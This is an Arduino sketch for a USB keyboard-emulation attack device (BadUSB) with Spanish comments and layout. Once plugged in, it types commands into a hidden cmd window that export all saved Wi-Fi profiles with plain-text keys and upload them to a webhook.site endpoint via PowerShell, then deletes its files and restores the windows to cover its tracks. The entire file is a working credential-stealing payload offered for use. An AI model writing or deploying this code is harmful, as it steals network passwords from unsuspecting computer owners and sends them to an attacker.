#include <Keyboard.h>
#include <Keyboard_es_ES.h>
#define KEY_DELAY 35 // delay between keystrokes for slow computers
#define EXEC_DELAY 300

const String HOOK_SITE = "https://webhook.site/TU HOOK";
int i = 0;

void setup() {
  Keyboard.begin(KeyboardLayout_es_ES);
  delay(500); 
}

void loop() {
  if (i == 0) {
   
    minimizeWindows();
    openCmd();
    executeComandConsole("md temp");
    executeComandConsole("cd ./temp");
    executeComandConsole("netsh");
    executeComandConsole("wlan");
    executeComandConsole("export profile key=clear");
    executeComandConsole("exit");
    executeComandConsole("copy *.xml wifi.txt");
    executeComandConsole("powershell Invoke-WebRequest -Uri "+ HOOK_SITE +" -Method POST -InFile wifi.txt");
    delay(1000);//extra delay
    executeComandConsole("cd ..");
    executeComandConsole("rmdir /S /Q temp");
    executeComandConsole("exit");
    restoreWindows();
    
    i++;
  }
}

void pressCombination(char key1, char key2){
    Keyboard.press(key1);
    Keyboard.press(key2);
    delay(KEY_DELAY);
    Keyboard.releaseAll();
}

void pressCombination(char key1, char key2, char key3){
    Keyboard.press(key1);
    Keyboard.press(key2);
    Keyboard.press(key3);
    delay(KEY_DELAY);
    Keyboard.releaseAll();
}

void minimizeWindows(){
  pressCombination(KEY_LEFT_GUI, 'm');
  delay(EXEC_DELAY);
}

void restoreWindows() {
  pressCombination(KEY_LEFT_GUI, KEY_LEFT_SHIFT, 'm');
  delay(EXEC_DELAY);
}

void openCmd(){
    pressCombination(KEY_LEFT_GUI, 'r');
    delay(EXEC_DELAY);
    Keyboard.print("cmd");
    Keyboard.write(KEY_RETURN);
    delay(EXEC_DELAY);
    executeComandConsole("mode con: cols=20 lines=1");
}

void executeComandConsole(String comand){
    Keyboard.print(comand);
    Keyboard.write(KEY_RETURN);
    delay(EXEC_DELAY);
}
